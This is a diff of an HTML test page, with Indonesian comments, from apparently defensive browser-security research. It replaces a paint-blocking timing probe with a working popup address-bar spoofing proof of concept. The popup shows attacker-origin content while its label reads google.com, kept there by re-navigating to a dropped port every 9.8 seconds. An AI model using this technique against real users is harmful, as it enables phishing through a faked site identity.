@@ -1,28 +1,17 @@
-<!-- 2 | halaman TUJUAN untuk 1.html — memblokir paint pertamanya sendiri | [otomatis]
-     Skrip di <head> berjalan SEBELUM apa pun dilukis. Selama ia berjalan, dokumen ini
-     tidak punya satu frame pun untuk ditampilkan - jadi kompositor menahan piksel HALAMAN
-     SEBELUMNYA di layar. Sementara itu navigasi sudah COMMIT, jadi omnibox sudah menulis URL INI.
-     Blokirnya sinkron dan DIBATASI (maks 8 detik, di tab sendiri). Bukan DoS: satu tab,
-     milikmu, berhenti sendiri - ini pengukuran amplifier, bukan peledakan.
-     ANGKA YANG DICETAK di bawah = lama jendela sebenarnya, diukur dari klik sampai frame pertama. -->
+<!-- UPGRADE M2 -> M1. Koordinat baru: G=popup-ber-window-features x A=dead-port.
+     Korpus punya dead-port di TAB (17-minimal/01) dan popup chromeless TANPA hang (batch20 #13);
+     gabungan "popup yang label-nya sudah kosong, lalu diisi URL PENDING" belum ada file-nya.
+     PREDIKAT: label popup menulis www.google.com sementara dokumennya milik origin penyerang.
+     EXPECTED-SECURE: label tetap kosong/about:blank/origin asli - URL hanya muncul saat COMMIT.
+     Port 82 dipilih karena DI-DROP (timeout); port yang me-RST memicu error-page commit instan = bar jujur lagi.
+     Interval 9800 ms menembak ulang tepat sebelum timeout jaringan ~10 s. Pasangkan dengan 03 sbg baseline. -->
 <script>
-var q = +(new URLSearchParams(location.search).get('block') || 0);
-var ms = Math.min(Math.max(q, 0), 8000);
-var t = Date.now(); while (Date.now() - t < ms);
+var T = 'https://www.google.com:82/';
+function m1(){
+  var w = window.open('', '_blank', 'width=420,height=320');
+  w.document.write('<h2>Dokumen ini milik ' + location.origin + ' &mdash; BUKAN google.com</h2>');
+  w.location = T;                                              // SWAP: label mulai mengecat T (pending)
+  setInterval(function(){ w.location = T; }, 9800);            // HOLD: arm-ulang sebelum timeout
+}
 </script>
-<h2 style="font:20px system-ui;color:#b00">HALAMAN B — baru muncul SEKARANG</h2>
-<pre id=g style="font:12px/1.7 monospace"></pre>
-<a href="1.html">kembali ke A</a>
-<script>
-var t0 = +sessionStorage.t0 || 0;
-var gap = t0 ? Date.now() - t0 : 0;
-try { sessionStorage.gapBack = gap; } catch (e) { }   // dibaca 12.html sbg lengan kontrol
-g.textContent =
-  'REAL ORIGIN     : ' + location.href +
-  '\nblokir diminta  : ' + q + ' ms  (dibatasi ke ' + ms + ')' +
-  '\n\nJENDELA TERUKUR : ' + gap + ' ms' +
-  '\n  = selama ' + gap + ' ms, address bar menulis 2.html' +
-  '\n    sementara layar masih menampilkan 1.html' +
-  '\n\n>500 ms konsisten = jendela yang bisa dipakai -> screenshot -> lapor' +
-  '\n~0 ms = browser menahan bar sampai paint (aman)';
-</script>
+<button onclick="m1()">M1 &mdash; origin PALSU di label popup</button>
